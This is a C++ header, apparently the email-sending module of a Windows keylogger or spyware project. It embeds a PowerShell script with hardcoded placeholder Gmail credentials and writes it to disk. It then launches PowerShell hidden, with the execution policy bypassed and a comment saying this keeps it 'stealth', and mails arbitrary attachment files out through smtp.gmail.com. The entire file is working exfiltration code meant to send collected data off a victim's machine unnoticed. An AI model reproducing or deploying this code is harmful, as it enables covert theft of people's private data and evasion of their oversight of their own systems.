#ifndef SENDMAIL_H
#define SENDMAIL_H
#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "SendEmail.ps1"

namespace Mail
{   // for email details, in real life use, you only need to update the following
    #define X_EM_TO "mail@somemail.com"
    #define X_EM_FROM "mail@somemail.com"
    #define X_EM_PASS "somepassword"

    const std::string &PowerShellScript =
"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    // undef to protect the data
    #undef X_EM_TO
    #undef X_EM_FROM
    #undef X_EM_PASS

    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
    {
        if(what.empty())
            return s;
        size_t sp = 0;  // string position

        while((sp = s.find(what, sp)) != std::string::npos) // npos = our string to termination
            s.replace(sp, what.length(), with), sp += with.length();
        return s;
    }

    bool CheckFileExists(const std::string &f)
    {
        std::ifstream file(f);
        return (bool)file;  // pretty much wysiwyg
    }

    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
        if(!script)
            return false;
        script << PowerShellScript;

        if(!script)
            return false;

        script.close();

        return true;
    }

    Timer m_timer;  // global variable, to not "die" after the function ends, so if the mail-send fails, we can repeat the function

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        bool ok;    // used for testing within this code

        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok)
            return -1;  // we weren't able to create a directory
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExists(scr_path))
            ok = CreateScript();
        if(!ok)
            return -2;  // the creation was unsuccessful
        // string for invoking the PowerShell script
        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                            + StringReplace(subject, "\"", "\\\"") + "\" -Body \""
                            + StringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;     // prevent process from closing so we can see how it performs etc
        ShExecInfo.hwnd = NULL;         // we should not have a window when running, in order to be stealth
        ShExecInfo.lpVerb = "open";     // essentially, the right-click + open we do to files
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;  // represents a working directory, which we don't really need in this case
        ShExecInfo.nShow = SW_HIDE;     // so it remains hidden (does not "pop" up)
        ShExecInfo.hInstApp = NULL;     // basically "handles" the instance

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        if(!ok)
            return -3;

        WaitForSingleObject(ShExecInfo.hProcess, 7000); // wait for 7sec
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);    // check how the powershell worked out

        m_timer.SetFunction([&]()  // lamda or "anonymous" function
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);    // wait 1 min
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);    // get exit code
            if((int)exit_code == STILL_ACTIVE)    // exit code = 259 if it's still active
                TerminateProcess(ShExecInfo.hProcess, 100);
            Helper::WriteAppLog("<From SendMain> Return code: " + Helper::ToString((int)exit_code));
        });

        m_timer.RepeatCount(1L);    // so, execute on;y once
        m_timer.SetInterval(10L);
        m_timer.Start(true);

        return (int)exit_code;
    }
    // we want to overload the SendMain() function
    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
    {
        std::string attachments = "";
        if(att.size() == 1U)    // U = unsigned integer, so if we have only one attachment
            attachments = att.at(0);
        else    // else, we construct a  string of attachments
        {
            for(const auto &v : att)
                attachments += v + "::";
            attachments = attachments.substr(0, attachments.length() - 2);
        }

        return SendMail(subject, body, attachments);
    }
}

#endif // SENDMAIL_H
